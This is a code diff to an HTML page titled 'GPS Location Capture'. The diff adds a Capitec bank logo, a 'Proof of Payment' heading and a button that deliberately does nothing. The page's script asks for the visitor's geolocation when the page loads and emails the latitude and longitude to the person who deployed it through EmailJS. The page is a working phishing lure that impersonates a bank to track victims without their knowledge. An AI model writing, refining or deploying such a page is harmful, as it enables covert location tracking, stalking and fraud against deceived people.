@@ -1,16 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-5">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>GPS Location Capture</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh; /* Full height of viewport */
+            margin: 0;
+            background-color: #f0f0f0; /* Light background color */
+        }
+        img {
+            max-width: 150px; /* Adjust logo size */
+            margin-bottom: 20px; /* Space below logo */
+        }
+        h1 {
+            font-size: 2em; /* Larger font for title */
+            margin: 0;
+        }
+        p {
+            font-size: 1em; /* Smaller font for subtitle */
+            margin: 5px 0 20px; /* Space around subtitle */
+        }
+        button {
+            padding: 10px 20px; /* Button padding */
+            font-size: 1em; /* Button font size */
+            cursor: pointer; /* Pointer cursor on hover */
+        }
+    </style>
 </head>
 <body>
-    <h1>Click for Proof of Payment</h1>
-    <h1>Please enable Location</h1>
+    <!-- Logo -->
+    <img src="https://cdn.freelogovectors.net/wp-content/uploads/2020/09/capitec-logo.png" alt="Logo"> <!-- Replace with your logo URL -->
 
-     <button id="proofOfPaymentButton" onclick="doNothing()">Proof of Payment</button>
+    <!-- Text Content -->
+    <h1>Proof of Payment</h1>
+    <p>Please enable Location</p>
+
+    <!-- Button that does nothing when clicked -->
+    <button id="proofOfPaymentButton" onclick="doNothing()">Proof Of Payment</button>
 
     <script>
         (function() {
@@ -30,10 +63,10 @@
             const lng = position.coords.longitude;
 
             const templateParams = {
-                latitude: lat,
-                longitude: lng,
-                to_name: 'Anon', // Change as needed
-                from_name: 'Intrepid', // Change as needed
+                latitude: lat,  
+                longitude: lng, 
+                to_name: 'Recipient Name', // Change as needed
+                from_name: 'Your Name', // Change as needed
                 message: 'Here is my GPS location.'
             };
 
@@ -60,6 +93,11 @@
                     console.error("An unknown error occurred.");
                     break;
             }
+        }
+
+        function doNothing() {
+            // This function intentionally does nothing
+            console.log("Button clicked, but does nothing.");
         }
 
         // Automatically call getLocation when the page loads
